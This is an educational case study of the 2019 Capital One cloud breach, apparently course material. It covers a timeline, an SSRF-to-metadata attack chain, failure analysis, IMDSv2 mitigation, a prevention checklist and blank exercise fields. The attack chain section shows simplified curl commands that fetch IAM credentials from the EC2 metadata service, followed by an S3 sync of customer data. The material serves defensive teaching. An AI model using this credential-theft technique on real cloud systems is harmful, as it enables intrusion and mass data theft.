# Capital One Breach (2019)

## The Headlines

**106 million customers affected. $80 million fine. One misconfigured firewall.**

In July 2019, a former AWS employee exploited a misconfigured web application firewall (WAF) to steal personal data of over 100 million Capital One customers. It remains one of the largest cloud security breaches in history.

## Timeline

| Date | Event |
|------|-------|
| March 2019 | Attacker discovers vulnerability |
| March 22-23, 2019 | Data exfiltration occurs |
| July 17, 2019 | Attacker posts on Twitter/GitHub |
| July 19, 2019 | Tip received by Capital One |
| July 29, 2019 | FBI arrests attacker |

**Dwell time:** ~4 months (attacker had access for months before discovery)

## Technical Details

### The Vulnerable Setup

Capital One used a Web Application Firewall (WAF) in front of their applications. This WAF had a misconfiguration that allowed Server-Side Request Forgery (SSRF).

```
Internet → WAF → Application → EC2 Instance (with IAM Role)
                                      ↓
                              Instance Metadata Service
                              (169.254.169.254)
```

### The Attack Chain

**Step 1: SSRF Exploitation**

The attacker found an endpoint that would make requests to arbitrary URLs:

```bash
# Simplified representation of the SSRF attack
curl "http://[vulnerable-app]/proxy?url=http://169.254.169.254/latest/meta-data/"
```

This returned the EC2 instance's metadata.

**Step 2: Credential Extraction**

Using SSRF, the attacker accessed the IAM role credentials:

```bash
# Get the role name
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns: ISRM-WAF-Role

# Get the credentials
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role"
# Returns: AccessKeyId, SecretAccessKey, Token
```

IMDSv1 (the version enabled) returned these credentials without any authentication.

**Step 3: S3 Access**

The IAM role had **excessive permissions** - it could list and read all S3 buckets:

```bash
# Using the stolen credentials
aws s3 ls
aws s3 sync s3://capital-one-customer-data /local/folder
```

**Step 4: Data Exfiltration**

The attacker downloaded:
- 140,000 Social Security numbers
- 80,000 bank account numbers
- 1 million Canadian Social Insurance numbers
- Personal information of 106 million people

## What Went Wrong

### 1. SSRF Vulnerability
The WAF allowed arbitrary URL fetching without validation.

### 2. IMDSv1 Enabled
The metadata service returned credentials to any request from the instance.

### 3. Over-Permissioned IAM Role
The WAF role could read **all** S3 buckets, not just the ones it needed.

### 4. No Network Segmentation
The application could reach the metadata service directly.

### 5. No Anomaly Detection
Massive data transfers went undetected for months.

## The 5-Question Analysis

### 1. How did they get in?
**SSRF vulnerability** in the WAF configuration allowed the attacker to make requests to internal services, including the EC2 metadata service.

### 2. What did they find?
**IAM credentials** exposed through the Instance Metadata Service (IMDS). The attacker discovered the EC2 instance had an IAM role with broad S3 access.

### 3. How did they move?
**Credential theft** - extracted temporary AWS credentials from IMDS, then used those credentials to authenticate to AWS services directly.

### 4. What did they take?
**106 million customer records** - Social Security numbers, bank account numbers, personal information stored in S3 buckets.

### 5. When could they have detected it?
Multiple opportunities:
- **Unusual metadata API calls** from the WAF to IMDS
- **Bulk S3 downloads** from a role that typically doesn't read data
- **Off-hours activity** during the exfiltration
- **Outbound data transfer spikes** leaving the network

## How AWS Responded

### IMDSv2 (Released November 2019)

AWS created a new version of the metadata service that requires a session token:

```bash
# IMDSv2 requires a PUT request first to get a token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Then use the token for subsequent requests
curl "http://169.254.169.254/latest/meta-data/" \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

SSRF attacks typically can't make PUT requests, so IMDSv2 blocks this attack vector.

## Prevention Checklist

- [ ] Enable IMDSv2 on all EC2 instances
- [ ] Use least-privilege IAM roles
- [ ] Implement SSRF protections in applications
- [ ] Monitor for unusual metadata API calls
- [ ] Alert on bulk data downloads
- [ ] Regular permission audits

## Your Analysis

Answer the 5 questions in your own words:

**1. How did they get in?**
```
Your answer:


```

**2. What did they find?**
```
Your answer:


```

**3. How did they move?**
```
Your answer:


```

**4. What did they take?**
```
Your answer:


```

**5. When could they have detected it?**
```
Your answer:


```

## Further Reading

- [AWS Blog: IMDSv2](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)
- [Department of Justice Press Release](https://www.justice.gov/usao-wdwa/pr/former-seattle-tech-worker-convicted-wire-fraud-and-computer-intrusions)
